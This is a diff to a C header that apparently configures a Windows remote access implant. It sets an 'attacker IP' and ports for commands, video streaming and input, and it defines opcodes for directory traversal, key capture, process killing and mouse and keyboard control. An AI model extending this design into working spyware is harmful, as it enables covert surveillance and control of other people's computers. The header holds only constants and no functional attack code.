@@ -11,6 +11,7 @@ All #define constants will also been included in this file
 #include <winsock2.h> // windows socket header
 #include <shlwapi.h> // useful functions for directory traversal
 #include <stdio.h> // standard input/output
+// TODO - use C++ strings
 #include <string.h> // standard string functions
 #include <windows.h> // include this last to avoid repeat declarations
 
@@ -19,11 +20,11 @@ All #define constants will also been included in this file
 #pragma comment(lib, "Shlwapi.lib")
 
 // attacker IP and primary communication port
-//#define CMD_SERVER_ADDR "127.0.0.1"
+//#define SERVER_ADDR "127.0.0.1"
 #define SERVER_ADDR "192.168.56.1"
-#define SERVER_CMD_PORT 8080
-#define SERVER_VIDEO_PORT 8081
-#define SERVER_INPUT_PORT 8082
+#define SERVER_CMD_PORT 42967
+#define SERVER_VIDEO_PORT 42968
+#define SERVER_INPUT_PORT 42969
 
 // change directory and list directory contents
 #define CHANGE_DIR 1
@@ -44,10 +45,6 @@ All #define constants will also been included in this file
 #define END_KEYS 14
 // end the process
 #define KILL_PROC 12
-// print the rest of the message to provide useful info
-#define PRINT_INFO 15
-// inform the attacker what the current directory is
-#define NEW_CURR_DIR 16
 // constants for controlling the mouseand keyboard
 /*
 Frame layout:
